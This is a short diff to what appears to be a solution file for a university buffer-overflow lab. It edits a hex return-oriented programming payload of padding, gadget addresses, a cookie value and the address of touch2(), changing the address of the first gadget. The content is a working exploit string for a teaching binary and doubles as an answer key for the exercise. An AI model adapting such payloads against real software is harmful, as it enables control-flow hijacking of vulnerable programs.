@@ -5,7 +5,7 @@
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
-29 1b 40 00 00 00 00 00 /* gadget 1: popq %rax */
+90 1a 40 00 00 00 00 00 /* gadget 1: popq %rax */
 e7 de 6a 27 00 00 00 00 /* value of the cookie */
 6d 1a 40 00 00 00 00 00 /* gadget 2: move %rax to %rdi */
 b7 18 40 00 00 00 00 00 /* address of touch2() */
